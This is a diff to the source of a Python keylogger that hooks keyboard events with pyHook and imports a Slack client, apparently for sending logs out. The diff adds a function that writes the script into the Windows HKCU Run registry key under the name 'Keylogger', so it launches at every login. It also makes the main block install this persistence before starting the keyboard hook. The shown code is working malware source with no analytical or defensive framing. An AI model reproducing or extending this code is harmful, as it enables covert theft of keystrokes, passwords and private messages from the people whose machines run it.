@@ -6,7 +6,7 @@ import configparser
 import time
 from datetime import datetime
 from slackclient import SlackClient
-# from winreg import *
+from _winreg import *
 
 #########################################
 #		INITIALIZATION VARIABLES		#
@@ -36,11 +36,13 @@ MODE = 1
 #		KEYLOGGER FUNCTIONS 	#
 #################################
 
-def startup(func):
-	"""
-	todo :
-	implement decorator @startup to launch keylogger when starting the computer
-	"""
+def run_at_startup():
+	path = os.path.dirname(os.path.realpath(__file__))
+	fname = sys.argv[0]
+	full_path = "\\".join([path, fname])
+	sub_key = 'Software\Microsoft\Windows\CurrentVersion\Run'
+	with OpenKey(HKEY_CURRENT_USER, sub_key, 0, KEY_ALL_ACCESS) as key:
+		SetValueEx(key, "Keylogger", 0, REG_SZ, full_path)
 
 def on_keyboard(event):
 	global DATA
@@ -95,14 +97,9 @@ def is_relevant_window(WindowName, key_words):
 ####################
 
 if __name__ == '__main__':
-	try:
-		hm = pyHook.HookManager()
-		hm.SubscribeKeyDown(on_keyboard)
-		hm.HookKeyboard()
-		# infinite loop
-		pythoncom.PumpMessages()
-	except:
-		hm.UnhookKeyboard()
-		time.sleep(1)
-		hm.HookKeyboard()
-
+	run_at_startup()
+	hm = pyHook.HookManager()
+	hm.SubscribeKeyDown(on_keyboard)
+	hm.HookKeyboard()
+	# infinite loop
+	pythoncom.PumpMessages()
